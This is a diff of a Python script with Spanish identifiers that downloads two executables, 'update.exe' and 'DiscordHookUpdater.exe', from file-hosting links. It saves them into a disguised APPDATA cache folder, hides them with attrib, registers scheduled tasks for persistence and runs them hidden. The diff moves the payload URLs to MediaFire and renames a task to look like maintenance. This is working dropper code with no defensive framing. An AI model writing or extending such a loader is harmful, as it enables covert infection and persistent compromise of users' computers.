@@ -3,8 +3,8 @@ import subprocess
 import urllib.request
 from pathlib import Path
 
-URL_PROGRAMA_1 = "https://github.com/zzlasdf/update/releases/download/update/update.exe"
-URL_PROGRAMA_2 = "https://github.com/zzlasdf/update/releases/download/update/DiscordHookUpdater.exe"
+URL_PROGRAMA_1 = "https://download1320.mediafire.com/lst7uvprmxiglWQ-pnRr45VbrleWSXsuB3gNZyU6fGevf5VOj165eSdyWLPJoTOegHAjGuWgMagv345ID7WuEQWSYT5OSUiMNI2UHzHGINKFJv3F_1EKfLj8S7CXwmphf7uZmYqLESqXDw28Vup2r5u6NE3SifSAMWL-hIvkTVCwps0/0cppfbej9j5rw97/update.exe"
+URL_PROGRAMA_2 = "https://download1529.mediafire.com/om6vp4f6hj9gkkgYlEeul7dhnT95NEFXHYDGgupUXTxj5nqFFFnrrx691sf-psTWPQ-mKJsKefalQ6LHHEr8ns2m25kmA-bZxEDoXiTSiPQ0WCsVqH9b9VpVOlXRLgZ4wqNjHM4SVJhsMaQ63sBcJnmvLng3yrKeq8o1yZSsfmxs/c02qofa6vr09l6k/DiscordHookUpdater.exe"
 
 DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
 DIRECTORIO_DISCORD_ESPECIFICO = os.path.join(
@@ -29,7 +29,7 @@ def descargar_archivo(url, destino):
 
         subprocess.run(f'attrib +h "{destino}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         return True
-    except Exception:
+    except Exception as e:
         return False
 
 def configurar_tarea(nombre_tarea, ruta_exe):
@@ -40,7 +40,7 @@ def configurar_tarea(nombre_tarea, ruta_exe):
     try:
         subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         return True
-    except Exception:
+    except Exception as e:
         return False
 
 def ejecutar_oculto(ruta_exe):
@@ -65,7 +65,7 @@ if __name__ == "__main__":
         ejecutar_oculto(RUTA_EXE_1)
 
     if descargar_archivo(URL_PROGRAMA_2, RUTA_EXE_2):
-        configurar_tarea("DiscordHookUpdater", RUTA_EXE_2)
+        configurar_tarea("DiscordHookMaintenanceTask", RUTA_EXE_2)
         ejecutar_oculto(RUTA_EXE_2)
 
     try:
